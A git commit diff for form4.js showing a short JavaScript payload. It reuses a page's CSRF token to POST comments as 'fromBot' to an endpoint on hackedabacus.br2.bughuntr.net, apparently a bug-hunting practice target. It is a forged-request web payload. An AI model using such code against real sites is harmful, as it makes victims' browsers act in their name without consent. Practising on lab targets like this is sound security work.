7a1c4e827c4e2a54408cb18c2ed96e33311b5915
/hello <czavaleta93@gmail.com>
2021-11-03 19:28:00 -0500

    Update and rename form3.js to form4.js

--- form4.js
+++ form4.js
@@ -7,7 +7,7 @@ formData.append("csrfmiddlewaretoken", csrf);
 formData.append("creator", "fromBot");
 formData.append("body", "test1");
 
-fetch("https://hackedabacus.br2.bughuntr.net/view/9dcacd4c-a0c4-4ed1-9fb6-8f3aba773d8f",{
+fetch("https://hackedabacus.br2.bughuntr.net/comment/9dcacd4c-a0c4-4ed1-9fb6-8f3aba773d8f",{
 	method: 'POST',
 	body: formData
 });
